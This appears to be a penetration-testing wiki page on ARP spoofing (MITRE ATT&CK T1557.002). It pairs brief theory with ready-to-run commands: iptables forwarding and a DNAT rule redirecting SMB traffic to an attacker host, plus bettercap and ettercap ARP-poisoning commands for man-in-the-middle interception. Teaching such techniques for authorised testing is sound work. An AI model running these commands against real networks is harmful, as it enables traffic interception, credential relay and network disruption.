---
description: MITRE ATT&CK™ Sub-technique T1557.002
---

# 🛠️ ARP spoofing

## Theory

The ARP \(Address Resolution Protocol\) is used to link IPv4 addresses with MAC addresses, allowing machines to communicate within networks. Since that protocol works in broadcast, attackers can try to impersonate machines by answering ARP requests \(_"Who is using address 192.168.56.1? I am!"_\) or by flooding the network with ARP announcements \(_"Hey everyone, nobody asked but I'm the one using address 192.168.56.1"_\). This is called ARP spoofing \(also called ARP poisoning\).

## Practice

{% hint style="warning" %}
Since spoofing every address in a subnet can cause temporary but severe disruption in that subnet, it is highly recommended to target specific addresses and machines while doing ARP spoofing.
{% endhint %}

Examples of attacks

* ARP spoofing an SMB server and route received SMB packets to internal capture or relays servers
* ARP spoofing the DNS server then DNS spoofing when receiving DNS queries

Preparation

```bash
# IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# outgoing ICMP drop (prevents sending port/host unreachable to target)
iptables -A OUTPUT -p ICMP -j DROP

# internal traffic rerouting of SMB packets (port 445, can be changed)
iptables --table nat --append PREROUTING --proto tcp --dst $SPOOFED_IP --dport 445 --jump DNAT --to-destination $ATTACKER_IP:445
```

Spoofing

{% tabs %}
{% tab title="Bettercap" %}
Once bettercap is running

```bash
set arp.spoof.targets $TARGET_TO_POISON_IP
set arp.spoof.internal true
arp.ban on
```
{% endtab %}

{% tab title="Ettercap" %}


```bash
ettercap --text --quiet --nopromisc --mitm arp:remote /$SWITCH_IP// /$TARGET_TO_POISON_IP//
```
{% endtab %}
{% endtabs %}

## Resources

[http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html?m=1](http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html?m=1)

[https://luemmelsec.github.io/Relaying-101/\#arp-spoofing](https://luemmelsec.github.io/Relaying-101/#arp-spoofing)



